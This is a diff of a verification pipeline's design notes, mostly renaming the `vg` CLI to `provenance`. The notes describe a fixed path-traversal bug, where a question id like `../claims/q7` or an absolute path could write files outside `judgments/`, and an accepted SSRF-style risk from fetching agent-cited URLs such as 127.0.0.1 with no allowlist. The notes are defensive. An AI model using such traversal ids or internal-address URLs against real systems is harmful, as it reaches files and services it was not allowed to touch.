 `question_id` has been pattern-constrained since claims became files, and that looked like
-the traversal defence. It was, for claims. `vg judge` takes its question id from the command
+the traversal defence. It was, for claims. `provenance judge` takes its question id from the command
 line, where verifier agents (which have Bash) put it, and never builds a `Claim` — so
-`vg judge ../claims/q7 …` created and replaced a file outside `judgments/`, and an absolute
+`provenance judge ../claims/q7 …` created and replaced a file outside `judgments/`, and an absolute
 id (pathlib drops everything before one) could land anywhere.
 
 So `judgments.path_for()` checks the id against `models.QID_PATTERN` itself: the check lives
@@ -2300,7 +2300,7 @@ the agent's command line, but naming the run directory is that flag's whole job.
 
 ## Known and accepted: the pipeline fetches whatever a claim cites
 
-`vg verify` fetches agent-supplied URLs with redirects followed and no network allowlist,
+`provenance verify` fetches agent-supplied URLs with redirects followed and no network allowlist,
 so a claim citing `http://127.0.0.1:<port>/…` or a link-local address would be fetched and
 its text cached. That is SSRF-shaped, and it is deliberate: fetching arbitrary cited URLs
 is the entire job. Worth revisiting if this ever runs somewhere with sensitive services on
@@ -2319,7 +2319,7 @@ Credentials are read from the environment only. Never in the repo, never in a fi
 reads, never in a claim file, never logged. `credentials()` refuses a half-configured pair
 rather than sending a malformed header.
 
-`vg archive` says which mode it is in, because silently degrading to the anonymous path is
+`provenance archive` says which mode it is in, because silently degrading to the anonymous path is
 how a run ends up with a third of its citations unarchived and nobody noticing until the
 report.
 
@@ -2328,7 +2328,7 @@ its own bot protection blocks the archive crawler. An unarchivable citation is a
 the source, not a pipeline failure.
 
 **A successful save is not a usable snapshot.** On at least one cal-access page SPN reported
-success and captured the Incapsula bot check — HTTP 200, no text — and `vg archive` recorded
+success and captured the Incapsula bot check — HTTP 200, no text — and `provenance archive` recorded
 it as archived. On a row whose live page can't be read, that snapshot is the reviewer's only
 route to the text, so junk there is worse than nothing: it looks like evidence. Every
 snapshot is now checked (`verify.check_snapshot()`): the snippet must be in it, or for a
@@ -2343,7 +2343,7 @@ is an older capture standing in for a failed save on a query citation: its page 
 match while its figures belong to another cycle. `save()` returns that fallback with its
 error, so it is never recorded as fresh.
 
-When a save fails, `vg archive` keeps the pipeline's own earlier snapshot over that fallback,
+When a save fails, `provenance archive` keeps the pipeline's own earlier snapshot over that fallback,
 unless ours is known junk (`verify.junk_capture()`: a capture of another URL, a fetch that
 landed elsewhere, a bot check, nothing readable). Keeping it unconditionally meant that on a URL
 where SPN always fails (cal-access), a captured bot check could never be replaced by a good
@@ -2373,7 +2373,7 @@ names only your files.
 
 **A clean merge can delete what your code still uses.** When another branch deletes a helper
 or an import that your branch calls but never edits, git takes the deletion without a conflict.
-`vg clear-contradiction` hit this against #101's removal of the re-home: its archive helpers
+`provenance clear-contradiction` hit this against #101's removal of the re-home: its archive helpers
 and `judgments.py`'s `import shutil` would have merged away, and only the one test that fails a
 clearance on purpose reached the missing import. So when a sibling branch deletes code near
 yours, merge it into a scratch worktree (`git worktree add --detach`, outside `data/`) and run
